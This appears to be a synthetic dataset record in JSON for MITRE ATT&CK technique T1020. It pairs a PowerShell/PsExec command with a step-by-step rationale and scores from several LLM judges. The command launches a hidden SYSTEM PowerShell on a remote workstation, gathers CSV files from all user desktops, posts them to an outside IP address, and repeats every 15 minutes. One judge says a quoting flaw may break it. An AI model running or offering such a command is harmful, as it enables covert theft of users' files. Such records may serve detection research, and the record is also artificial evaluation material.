@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec \\\\WS-23 -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ Get-ChildItem 'C:\\Users\\*\\Desktop' -Filter *.csv -Recurse -File | ForEach-Object { Invoke-RestMethod -Uri 'https://198.51.100.88/ingest' -Method Post -InFile $_.FullName -ContentType 'text/csv' | Out-Null; if ($?) { Rename-Item -Force $_.FullName ($_.FullName + '.sent') } }; Start-Sleep 900 }\"",
+  "explanation": "Uses PSExec to remotely launch a hidden SYSTEM PowerShell on WS-23 that automatically exfiltrates CSV files via HTTP POST and marks them by renaming.",
+  "rationale_steps": [
+    "Remotely execute hidden PowerShell as SYSTEM on the target host using PSExec.",
+    "Enumerate CSV files from user desktops.",
+    "POST each file to a remote ingest API using Invoke-RestMethod without verbose output.",
+    "Rename files with a .sent suffix to mark completion and avoid repeats.",
+    "Sleep and repeat to maintain automation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-93d97d37",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "Flags and quoting are balanced, but invoking -Command with a double-quoted string from PowerShell will expand variables like $_ and $ProgressPreference locally, corrupting the embedded script.",
+        "semantic_score": 3,
+        "semantic_justification": "The logic matches automated HTTP exfiltration and remote SYSTEM execution, but in a PowerShell shell the variable-expansion issue would break the script and PSExec -s requires admin rights, reducing operational plausibility.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:17:39.439571Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, correct PowerShell syntax, valid PSExec parameters, and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using PSExec to launch a hidden PowerShell process that runs as SYSTEM, continuously scans for CSV files, exfiltrates them via HTTPS POST requests, marks processed files, and repeats on a 15-minute schedule.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:17:42.470778Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, and valid flags for all commands involved, ensuring parseability and execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 by establishing a persistent, hidden, automated process to discover specific files, exfiltrate them via HTTP POST to an external IP, and mark them to prevent re-exfiltration, all using realistic adversary techniques.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:40:59.242090Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
